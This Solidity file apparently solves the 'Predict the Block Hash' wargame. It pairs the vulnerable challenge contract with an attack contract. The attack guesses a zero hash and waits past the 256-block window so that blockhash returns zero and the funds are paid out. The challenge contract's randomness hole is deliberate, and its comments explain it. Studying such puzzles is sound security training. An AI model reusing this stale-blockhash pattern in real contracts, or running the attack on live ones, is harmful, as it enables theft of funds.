// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess   = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        // blockhash only returns last 256 blocks, otherwise returns 0x00
        // to hack just guess 0x00 then wait 260 blocks to settle()
        // as settlementBlockNumber will be too far in the past
        // search for blockhash @
        // https://docs.soliditylang.org/en/v0.8.17/cheatsheet.html
        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        if (guess == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}


contract PredictBlockHashAttack {

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function guess (address payable vulnContractAddr) external {
        PredictTheBlockHashChallenge vulnContract = PredictTheBlockHashChallenge(vulnContractAddr);
        // blockhash only returns last 256 blocks, otherwise returns 0x00
        // to hack just guess 0x00 then wait 260 blocks to settle()
        // as settlementBlockNumber will be too far in the past
        vulnContract.lockInGuess{value: 1 ether}(bytes32(0));
    }

    function settle (address payable vulnContractAddr) external {
        PredictTheBlockHashChallenge vulnContract = PredictTheBlockHashChallenge(vulnContractAddr);
        vulnContract.settle();
    }

    receive() external payable {}
    fallback() external payable {}
}